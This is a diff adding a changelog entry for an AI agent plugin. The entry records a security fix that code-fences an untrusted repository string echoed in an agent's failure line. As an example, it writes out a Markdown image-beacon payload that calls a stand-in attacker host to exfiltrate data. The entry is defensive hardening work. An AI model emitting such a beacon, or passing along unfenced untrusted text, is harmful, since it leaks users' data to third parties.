@@ -6,6 +6,15 @@ Entries are reverse-chronological (newest first) and reference the merging PR + 
 
 ---
 
+## v0.80.36
+
+Closes skills#695: `repo-indexer.md`'s Step 1 validation-failure line echoed the rejected `repo` string unfenced, the one site in this file lacking the "Excerpt containment" treatment its sibling agents already carry for the same untrusted-catalog-string shape.
+
+- **Gap closed** — Step 1 validates the dispatch-supplied `repo` string (sourced from `discover.mjs`'s `candidates[].source_repo`, itself pulled from the public, externally-writable skills.sh API / marketplace catalog) against `OWNER_REPO_RE`. On failure it returned `FAILED: <repo> — invalid owner/repo format` with the rejected value substituted raw — no code-span fencing. Because the regex charset excludes Markdown-active bytes like `!`/`[`/`]`/`(`/`)`, a crafted value carrying them fails validation (reaching exactly this branch) while still carrying a live payload; per Step 3 this line is the agent's entire response, and `init/SKILL.md`'s "Collect their one-line summaries" step may render it as Markdown, so an unfenced `evil-owner/repo![x](https://attacker.example/beacon.png?d=leak)` value would fire an exfiltration beacon or spoofed link the moment the summary displays. `security-auditor.md`'s "Excerpt containment for `candidate`/`alternative_suggestion`" note and `vuln-scanner.md`'s unconditional `file`/`function`/`module` wrapping already cover the structurally identical shape; `repo-indexer.md` had no equivalent note anywhere.
+- **Fix** — Step 1's failure line now wraps the rejected `<repo>` value in an inline code span before substitution. Added an explicit "Excerpt containment" note mirroring the sibling agents': backtick run one character longer than the longest run already inside the value, CR/LF collapsed to a single space before measuring, and a single literal space padded on both sides if the value begins or ends with a backtick. Scoped explicitly to this one site — Step 4's other two failure lines (`network unreachable`, `<stderr first line>`) substitute an `<owner>/<repo>` that already passed this same charset check, so they carry no Markdown-active bytes and need no wrapping. Added a matching `## Rules` cross-reference bullet. Docs-only; no script or schema changes.
+- **Scope** — `plugins/ievo/agents/repo-indexer.md` only.
+- **Version** — `fix:` → patch per AGENTS.md's bump table (security hardening, no new capability). `discover.mjs`, `evolution_candidates.mjs`, and `scrub.mjs` `SCRIPT_VERSION`, `plugin.json`, `marketplace.json`, and the AGENTS.md compliance ledger updated in lockstep (0.80.35 → 0.80.36).
+
 ## v0.80.35
 
 Bound `scrub.mjs`'s `NAME_ALT` camelCase alternative's leading run to close a third, previously-untracked ReDoS in the same unbounded-quantifier family — closes #692.
